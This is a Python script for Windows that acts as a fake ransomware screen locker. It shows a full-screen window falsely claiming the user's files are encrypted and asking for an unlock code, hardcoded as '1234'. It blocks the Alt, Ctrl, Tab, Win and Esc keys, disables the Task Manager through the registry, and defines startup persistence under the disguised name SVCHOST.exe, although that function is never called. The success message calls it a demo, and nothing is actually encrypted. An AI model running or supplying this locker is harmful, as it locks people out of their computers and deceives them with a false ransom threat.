import tkinter as tk
import random
import keyboard
import sys
import os
import winreg
import shutil
import subprocess
from pathlib import Path
from tkinter import messagebox
import time

BLACK = "#000000"
WHITE = "#ffffff"
RED = "#a60000"
GREEN = "#9cc9b5"

password = "1234"
path = sys.argv[0]
file_name = path.split('\\')[-1]


root = tk.Tk()
root.title("DECRYPTOR")
root.configure(bg=RED)
root.geometry("950x700+50+50")
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.resizable(False, False)

APP_NAME = "LOCKER"
INSTALL_DIR = Path(os.environ["LOCALAPPDATA"]) / APP_NAME
INSTALLED_EXE = INSTALL_DIR / "SVCHOST.exe"
REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

keyboard.block_key('tab')
keyboard.block_key('esc')
keyboard.block_key('win')
keyboard.block_key('alt')
keyboard.block_key('ctrl')\


os.system(
    'REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
    '/f /v "DisableTaskMgr" /t REG_DWORD /d 1'
)
def remove_from_startup():

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        ) as key:

            winreg.DeleteValue(key, APP_NAME)

    except FileNotFoundError:
        pass

def add_to_startup():

    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        REGISTRY_PATH,
        0,
        winreg.KEY_SET_VALUE
    ) as key:

        winreg.SetValueEx(
            key,
            APP_NAME,
            0,
            winreg.REG_SZ,
            f'"{INSTALLED_EXE}"'
        )


def block(event):
    return "break"

for key in ["Control_L", "Control_R",
            "Alt_L", "Alt_R",
            "Tab", "Super_L", "Super_R"]:
    root.bind_all(f"<{key}>", block)

def check_password():
    if entry.get() == password:
        result.config(
            text="DEMO UNLOCKED!",
            fg="#00ff66"
        )
        os.system(
            'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
            '/v "DisableTaskMgr" /f'
        )
        remove_from_startup()
        root.destroy()
    else:
        result.config(
            text="Incorrect code!",
            fg=WHITE
        )
        entry.delete(0, tk.END)

title = tk.Label(
    text="Ooops, your files have beed encrypted!",
    font=("Courier New", 20, "bold"),
    fg=WHITE,
    bg=RED
)
title.place(relx=0.6, y=10, anchor="n",
    width=620, height=60)

password_frame = tk.Frame(
    bg=RED,
)
password_frame.place(x=350, y=575, width=470, height=100)

tk.Label(
    password_frame,
    text="Enter the unlock code:",
    font=("Courier New", 15, "bold"),
    fg=WHITE,
    bg=RED
).pack(pady=(3, 2))


entry = tk.Entry(
    password_frame,
    font=("Courier New", 17, "bold"),
    bg=WHITE,
    fg=BLACK,
    insertbackground=RED,
    justify="center",
    relief="flat"
)
entry.pack(fill="x", padx=5, ipady=2)

result = tk.Label(
    text="",
    font=("Courier New", 10, "bold"),
    fg=WHITE,
    bg=RED
)
result.place(x=100, y=610)

frame = tk.Frame(
    bg=WHITE,
    highlightbackground=WHITE,
    highlightthickness=4
)
frame.place(x=250, y=70, width=660, height=480)

text = tk.Label(
    text="",
    font=("Courier New", 10, "bold"),
    fg=WHITE,
    bg=RED
)

timer_frame = tk.Frame(
    bg=RED,
    highlightbackground=WHITE,
    highlightthickness=3
)
timer_frame.place(x=20, y=210, width=215, height=175)

timer2_frame = tk.Frame(
    bg=RED,
    highlightbackground=WHITE,
    highlightthickness=3
)
timer2_frame.place(x=20, y=410, width=215, height=175)

button = tk.Button(
    text="DECRYPT",
    font=("Courier New", 12, "bold"),
    fg=BLACK,
    bg=WHITE,
    activeforeground=RED,
    activebackground="#cccccc",
    relief="flat",
    command=check_password,
    cursor="hand2"
)
button.place(x=830, y=600, width=110, height=60)



root.mainloop()